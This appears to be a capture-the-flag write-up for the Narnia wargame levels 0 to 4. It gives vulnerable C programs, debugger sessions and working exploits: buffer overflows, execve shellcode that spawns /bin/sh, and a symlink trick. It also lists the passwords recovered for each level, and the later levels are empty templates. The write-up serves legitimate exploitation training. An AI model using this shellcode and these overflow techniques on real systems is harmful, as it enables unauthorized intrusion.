# Narnia

## Generic stuff
Use peda: `source /usr/local/peda/peda.py`

## Lessons:
`Try different shellcode`\
`Shell vs Debugger: env vaiables may push stack down further`

## Narnia0
```
narnia0@narnia:/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: abcdabcdabcdabcd
buf: abcdabcdabcdabcd
val: 0x41414141
WAY OFF!!!!
```
```
narnia0@narnia:/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: aaaaaaaaaaaaaaaaaaaabbbb
buf: aaaaaaaaaaaaaaaaaaaabbbb
val: 0x62626262
WAY OFF!!!!
```
```
narnia0@narnia:/narnia$ ( echo -e "AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde";cat;) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
val: 0xdeadbeef
whoami
narnia1
cat /etc/narnia_pass/narnia1
efeidiedae
```
### Narnia1 password: efeidiedae
## Narnia1
### Source code:
```
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```
### Exploit:
```
narnia1@narnia:/narnia$ export EGG=$(python -c 'print "\x90" * 50')
```
```
[----------------------------------registers-----------------------------------]
EAX: 0xffffde6d --> 0x90909090
EBX: 0x0
ECX: 0x8048542 --> 0x69470047 ('G')
EDX: 0xffffde6b --> 0x90903d47
ESI: 0x1
EDI: 0xf7fc5000 --> 0x1b2db0
EBP: 0xffffd688 --> 0x0
ESP: 0xffffd680 --> 0x80484b8 (<main+77>:       mov    eax,0x0)
EIP: 0xffffde6d --> 0x90909090
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
=> 0xffffde6d:  nop
   0xffffde6e:  nop
   0xffffde6f:  nop
   0xffffde70:  nop
[------------------------------------stack-------------------------------------]
0000| 0xffffd680 --> 0x80484b8 (<main+77>:      mov    eax,0x0)
0004| 0xffffd684 --> 0xffffde6d --> 0x90909090
0008| 0xffffd688 --> 0x0
0012| 0xffffd68c --> 0xf7e2a286 (<__libc_start_main+246>:       add    esp,0x10)
0016| 0xffffd690 --> 0x1
0020| 0xffffd694 --> 0xffffd724 --> 0xffffd854 ("/narnia/narnia1")
0024| 0xffffd698 --> 0xffffd72c --> 0xffffd864 ("LC_ALL=en_US.UTF-8")
0028| 0xffffd69c --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0xffffde6d in ?? ()
gdb-peda$
```
Shell code from: `http://shell-storm.org/shellcode/files/shellcode-811.php`
```
narnia1@narnia:/narnia$ export EGG=$(python -c 'print "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
$ cat /etc/narnia_pass/narnia2
nairiepecu
$
```
### Narnia2 password: nairiepecu
## Narnia2
### Source code:
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```
### POC:
```
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0x0
ECX: 0x7fffff13
EDX: 0xf7fc6870 --> 0x0
ESI: 0x2
EDI: 0xf7fc5000 --> 0x1b2db0
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd5d0 ('C' <repeats 100 times>)
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffffd5d0 ('C' <repeats 100 times>)
0004| 0xffffd5d4 ('C' <repeats 96 times>)
0008| 0xffffd5d8 ('C' <repeats 92 times>)
0012| 0xffffd5dc ('C' <repeats 88 times>)
0016| 0xffffd5e0 ('C' <repeats 84 times>)
0020| 0xffffd5e4 ('C' <repeats 80 times>)
0024| 0xffffd5e8 ('C' <repeats 76 times>)
0028| 0xffffd5ec ('C' <repeats 72 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
gdb-peda$ set args  $(python -c 'print "A" * 132 + "B" * 4 + "C" * 100')
```
```
set args $(python -c 'print "A" * 132 + "\x90\xdd\xff\xff" + "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
```
### Exploit:
```
narnia2@narnia:/narnia$ env - ./narnia2 $(python -c 'print "A" * 132 + "\x90\xdd\xff\xff" + "\x90\x90\x90\x90\x90\x90\x
90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\
xcd\x80"')
Illegal instruction
narnia2@narnia:/narnia$ env - ./narnia2 $(python -c 'print "A" * 132 + "\x90\xdd\xff\xff" + "\x90" * 30 + "\x31\xc0\x50
\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
Illegal instruction
narnia2@narnia:/narnia$ env - ./narnia2 $(python -c 'print "A" * 132 + "\x90\xdd\xff\xff" + "\x90" * 60 + "\x31\xc0\x50
\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
$ id
uid=14002(narnia2) gid=14002(narnia2) euid=14003(narnia3) groups=14002(narnia2)
$
```
Narnia3 password: `vaequeezee`
## Narnia3
### Source code:
```
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){

    int  ifd,  ofd;
    char ofile[16] = "/dev/null";
    char ifile[32];
    char buf[32];

    if(argc != 2){
        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
        exit(-1);
    }

    /* open files */
    strcpy(ifile, argv[1]);
    if((ofd = open(ofile,O_RDWR)) < 0 ){
        printf("error opening %s\n", ofile);
        exit(-1);
    }
    if((ifd = open(ifile, O_RDONLY)) < 0 ){
        printf("error opening %s\n", ifile);
        exit(-1);
    }

    /* copy from file1 to file2 */
    read(ifd, buf, sizeof(buf)-1);
    write(ofd,buf, sizeof(buf)-1);
    printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

    /* close 'em */
    close(ifd);
    close(ofd);

    exit(1);
}
```
### PoC:
```
narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp$ history
narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp$ mkdir -p /tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2
narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp$ cd /tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2
narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp$ ls -la
narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp$ mkdir tmp
narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp$ ls -la /tmp/pwnme
narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp$ pwd
narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp$ ln -s /etc/narnia_pass/narnia4 pwnme
narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp$ /narnia/narnia3 /tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp/pwnme
narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp$ strace /narnia/narnia3 /tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp/pwnme
narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp$ touch /tmp/pwnme
narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp$ strace /narnia/narnia3 /tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp/pwnme
narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp$ chmod 777 /tmp/pwnme
narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp$ strace /narnia/narnia3 /tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp/pwnme
narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp$ /narnia/narnia3 /tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp/pwnme
```
### Exploit:
```
narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp$ cat /tmp/pwnme
thaenohtai
(. P$    narnia3@narnia:/tmp/aaaaaaaaaaaaaaaaaaaaaaaaab2/tmp$
```
### Narnia4 password: `thaenohtai`
## Narnia4
### Source code:
```
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

extern char **environ;

int main(int argc,char **argv){
    int i;
    char buffer[256];

    for(i = 0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));

    if(argc>1)
        strcpy(buffer,argv[1]);

    return 0;
}
```
### PoC:
```
env - gdb ./narnia4
source /usr/local/peda/peda.py
b *main
disassemble *main
b *main+116
set args $(python -c 'print "\x41" * 400')
...snip
EAX: 0x0
EBX: 0x0
ECX: 0xffffdfc0 ("AAAAAA")
EDX: 0xffffdd2e ("AAAAAA")
ESI: 0x2
EDI: 0xf7fc5000 --> 0x1b2db0
EBP: 0x41414141 ('AAAA')
ESP: 0xffffdcb0 ('A' <repeats 132 times>)
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xffffdcb0 ('A' <repeats 132 times>)
0004| 0xffffdcb4 ('A' <repeats 128 times>)
0008| 0xffffdcb8 ('A' <repeats 124 times>)
0012| 0xffffdcbc ('A' <repeats 120 times>)
0016| 0xffffdcc0 ('A' <repeats 116 times>)
0020| 0xffffdcc4 ('A' <repeats 112 times>)
0024| 0xffffdcc8 ('A' <repeats 108 times>)
0028| 0xffffdccc ('A' <repeats 104 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x41414141 in ?? ()
```
```
gdb-peda$ pattern_create 400
gdb-peda$ set args $(python -c 'print "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%y"')
gdb-peda$ pattern_offset 0x64254148
1680163144 found at offset: 264
set args $(python -c 'print "\x41" * 264 + "\x42" * 4 + "\x43" * 132')
```
```
EAX: 0x0
EBX: 0x0
ECX: 0xffffdfc0 ("CCCCCC")
EDX: 0xffffdd2e ("CCCCCC")
ESI: 0x2
EDI: 0xf7fc5000 --> 0x1b2db0
EBP: 0x41414141 ('AAAA')
ESP: 0xffffdcb0 ('C' <repeats 132 times>)
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffffdcb0 ('C' <repeats 132 times>)
0004| 0xffffdcb4 ('C' <repeats 128 times>)
0008| 0xffffdcb8 ('C' <repeats 124 times>)
0012| 0xffffdcbc ('C' <repeats 120 times>)
0016| 0xffffdcc0 ('C' <repeats 116 times>)
0020| 0xffffdcc4 ('C' <repeats 112 times>)
0024| 0xffffdcc8 ('C' <repeats 108 times>)
0028| 0xffffdccc ('C' <repeats 104 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
```
```
gdb-peda$ jmpcall
0x8048413 : call eax
0x804844d : call edx
0x80484a0 : call edx
0x8049413 : call eax
0x804944d : call edx
0x80494a0 : call edx
```
```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : disabled
```
### Exploit:
Extended the number of NOPS then attempted to guess the pointer to our shellcode
```
set follow-fork-mode parent
source /usr/local/peda/peda.py
set args $(python -c 'print "\x41" * 264 + "\xd0\xdc\xff\xff" + "\x90" * 90 + "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
./narnia4 $(python -c 'print "\x41" * 264 + "\xff\xd7\xff\xff" + "\x90" * 500 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80
\x31\xc0\x40\xcd\x80"')
$ whoami
narnia5
$ cat /etc/narnia_pass/narnia5
faimahchiy
```
### Narnia5 password: `faimahchiy`

## Narnia5
### Source code:
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){
        int i = 1;
        char buffer[64];

        snprintf(buffer, sizeof buffer, argv[1]);
        buffer[sizeof (buffer) - 1] = 0;
        printf("Change i's value from 1 -> 500. ");

        if(i==500){
                printf("GOOD\n");
        setreuid(geteuid(),geteuid());
                system("/bin/sh");
        }

        printf("No way...let me give you a hint!\n");
        printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
        printf ("i = %d (%p)\n", i, &i);
        return 0;
}
```
### PoC:
```
```
### Exploit:
```
```
### Narnia6 password: ``

## Narnia6
### Source code:
```
```
### PoC:
```
```
### Exploit:
```
```
### Narnia7 password: ``

## Narnia7
### Source code:
```
```
### PoC:
```
```
### Exploit:
```
```
### Narnia8 password: ``

## Narnia8
### Source code:
```
```
### PoC:
```
```
### Exploit:
```
```
### Narnia9 password: ``

## Narnia9
### Source code:
```
```
### PoC:
```
```
### Exploit:
```
```
### Narnia password: ``
